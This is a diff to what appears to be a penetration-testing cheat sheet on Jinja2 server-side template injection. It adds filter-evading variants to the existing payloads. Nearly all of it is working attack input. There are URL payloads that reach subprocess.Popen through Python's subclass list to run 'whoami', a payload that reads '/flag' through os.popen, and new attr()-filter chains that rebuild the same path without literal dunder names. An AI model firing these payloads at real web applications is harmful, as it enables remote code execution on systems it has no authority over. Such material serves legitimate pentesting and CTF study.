@@ -10,7 +10,8 @@ ${{<%[%'"}}%    # Special characteres for detection
 
 ### Jinja2
 
-```django
+{% code overflow="wrap" %}
+```bash
 http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__() }}   # To list all objects
 http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}   # Using subprocess.Popen index in 401 to achieve rce
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
@@ -22,8 +23,27 @@ http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=Tr
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
 {% set subclasses = "__subclasses__" %}
-{{ string|attr(subclasses) }}
+{{ string|attr(class) }}
+
+# Listing all subclasses
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+{% set mro_r = string|attr(class)|attr(mro) %}
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+{{ subclasses_r }}
+
+# Using Popen on 420
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+{% set mro_r = string|attr(class)|attr(mro) %}
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+{{ subclasses_r[420] }}
 ```
+{% endcode %}
 
 Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 
